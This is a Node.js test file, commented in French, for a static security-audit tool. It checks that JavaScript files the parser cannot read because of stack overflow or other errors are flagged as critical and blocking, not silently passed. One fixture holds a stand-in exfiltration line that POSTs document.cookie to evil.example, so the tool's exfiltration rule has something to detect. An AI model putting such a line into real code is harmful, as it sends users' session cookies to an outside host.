/**
 * Une lecture qui lève un dépassement de pile ne se conclut jamais en silence. Le code qu'une page exécute et que la lecture n'a pas
 * pu lire parce que sa pile déborde est un constat critique et bloquant (C-SURFACE-03, cause `profondeur`) qui empêche les axes du
 * fichier, et l'audit ne note jamais mieux ce code que le même code lu. Avant ce constat, la lecture qui échouait rendait `null`,
 * aucune règle ne voyait le fichier et l'audit concluait « conforme sous réserve » (88 sans navigateur, 92 avec) d'un fichier qu'il
 * n'avait pas lu.
 *
 * Un code réellement trop profond finit, selon l'état du compilateur JIT et celui du compilateur d'expressions régulières de V8,
 * dans une exception (que ce fichier éprouve), dans un code qui se lit, ou dans l'abandon du processus (code 134) : aucune de ces
 * fins ne se rejoue à coup sûr dans un essai. Ici la lecture lève sur commande, là où acorn convertit sa source en chaîne
 * (`String(source)`), donc toujours, sans dépendre de la pile de la machine ni de l'état de V8 ; le rejeu d'un code réellement
 * profond, lancement après lancement, est `scripts/rejouer-fichier-profond.mjs`. Chaque essai a son mutant dans
 * `scripts/mutants-lecture-qui-leve.mjs`.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { avecWidget, page } from './aide-surface.mjs';
import { construireContexte } from '../src/contexte/inventaire.js';
import { analyseStatique } from '../src/moteur/statique.js';
import { noter } from '../src/moteur/notation.js';
import { lire } from '../src/moteur/analyse-js.js';

const SANS_RIEN = 'var a = 1;\n';
const charge = (...noms) => page(noms.map((n) => `<script src="${n}"></script>`).join(''));
const TOUS = ['A', 'B', 'C', 'E', 'F'];
const noterStatique = (constats) => noter(constats, new Set(['D']));

/** Les deux formes qu'un dépassement de pile prend dans la lecture : celle de V8, et celle qu'acorn en fait quand il l'attrape lui-même (`catchStackOverflow`). */
const DEPASSEMENT_V8 = () => new RangeError('Maximum call stack size exceeded');
const DEPASSEMENT_ACORN = () => new SyntaxError('Not enough stack space to parse input (1:815)');
/** Une erreur qui n'est ni un dépassement de pile ni une erreur de syntaxe : un défaut de l'outil ou de sa dépendance. */
const DEFAUT = () => new TypeError('Cannot read properties of undefined (reading \'type\')');

/**
 * Le texte d'un fichier, tel que l'outil le lit partout, sauf dans acorn : sa lecture convertit la source en chaîne, et cette
 * conversion-là lève l'erreur demandée. Une chaîne (`extends String`) : les règles qui lisent le texte du fichier le reçoivent.
 */
class LectureQuiLeve extends String {
  constructor(texte, erreur) {
    super(texte);
    this.erreur = erreur;
    this.levees = 0;
  }

  [Symbol.toPrimitive]() {
    if (/[\\/]acorn[\\/]/.test(new Error().stack)) { this.levees++; throw this.erreur(); }
    return String.prototype.valueOf.call(this);
  }
}

/** Audite un widget dont le texte de `chemin`, établi par l'inventaire, n'est plus lisible par acorn : la surface est celle du vrai fichier, la lecture des règles lève. */
async function auditerEnLisantMal(fichiers, chemin, erreur) {
  return avecWidget(fichiers, {}, async (racine) => {
    const ctx = construireContexte(racine);
    const f = ctx.fichiers.find((x) => x.chemin === chemin);
    assert.ok(f?.executee, `prémisse : la page charge ${chemin}`);
    const contenu = new LectureQuiLeve(f.contenu, erreur);
    f.contenu = contenu;
    const constats = await analyseStatique(ctx, { reseau: false });
    return { ctx, constats, contenu, de: (regle, fichier) => constats.filter((c) => c.regle === regle && (fichier === undefined || c.fichier === fichier)) };
  });
}

const etat = (c) => `${c.severite}${c.bloquant ? ' bloquant' : ''}`;

test('prémisse : une lecture qui lève un dépassement de pile dit « profondeur », la même lecture sans la panne donne l\'arbre', () => {
  for (const erreur of [DEPASSEMENT_V8, DEPASSEMENT_ACORN]) {
    const lecture = lire(new LectureQuiLeve(SANS_RIEN, erreur));
    assert.equal(lecture.ast, null);
    assert.equal(lecture.erreur.cause, 'profondeur');
    assert.equal(lecture.erreur.message, 'la pile déborde');
  }
  assert.ok(lire(SANS_RIEN).ast, 'le même texte, lu sans la panne, se lit');
});

for (const [nom, erreur] of [['le dépassement de pile de V8', DEPASSEMENT_V8], ['celui qu\'acorn attrape lui-même', DEPASSEMENT_ACORN]]) {
  test(`une lecture qui lève ${nom} n'est pas avalée : le fichier que la page exécute est dit illisible par profondeur, bloquant, et l'audit ne conclut pas`, async () => {
    const a = await auditerEnLisantMal({ 'index.html': charge('app.js'), 'app.js': SANS_RIEN }, 'app.js', erreur);
    assert.ok(a.contenu.levees >= 2, `la lecture a bien levé, en module puis en script (${a.contenu.levees})`);
    const illisibles = a.de('C-SURFACE-03');
    assert.equal(illisibles.length, 1, 'un constat par fichier, non un par règle qui a voulu le lire');
    const [c] = illisibles;
    assert.equal(etat(c), 'critique bloquant');
    assert.equal(c.fichier, 'app.js');
    assert.equal(c.preuve.cause, 'profondeur');
    assert.equal(c.preuve.message, 'la pile déborde');
    assert.match(c.constat, /sa pile déborde\. S'il s'exécute dans le navigateur, aucune règle ne l'a lu\./);
    assert.deepEqual(c.axesEmpeches, TOUS);
    const n = noterStatique(a.constats);
    assert.deepEqual(n.axesEmpeches, TOUS);
    assert.equal(n.verdict, 'NON CONFORME');
    assert.ok(n.bloquants.length >= 1);
    assert.equal(n.global, 0, 'tous les axes du fichier empêchés : notés zéro, non laissés à leur note');
    const lisible = await avecWidget({ 'index.html': charge('app.js'), 'app.js': SANS_RIEN }, {}, async (racine) => {
      const constats = await analyseStatique(construireContexte(racine), { reseau: false });
      return { constats, illisibles: constats.filter((x) => x.regle === 'C-SURFACE-03') };
    });
    assert.deepEqual(lisible.illisibles, [], 'le même fichier, lu, n\'a rien à dire');
    assert.ok(noterStatique(lisible.constats).global > n.global, 'le fichier qu\'on n\'a pas lu ne note jamais mieux que celui qu\'on a lu');
  });
}

test('une lecture qui lève une erreur qui n\'est pas un dépassement de pile n\'est avalée ni ne fait tomber l\'audit : le fichier est dit illisible, bloquant, axes empêchés', async () => {
  const a = await auditerEnLisantMal({ 'index.html': charge('app.js', 'autre.js'), 'app.js': SANS_RIEN, 'autre.js': 'fetch("https://evil.example/c", { method: "POST", body: document.cookie });\n' }, 'app.js', DEFAUT);
  const illisibles = a.de('C-SURFACE-03');
  assert.equal(illisibles.length, 1);
  assert.equal(etat(illisibles[0]), 'critique bloquant');
  assert.equal(illisibles[0].fichier, 'app.js');
  assert.deepEqual(illisibles[0].axesEmpeches, TOUS);
  assert.ok(a.de('C-EXFIL-01', 'autre.js').length > 0, 'le fichier d\'à côté est audité comme s\'il était seul');
});
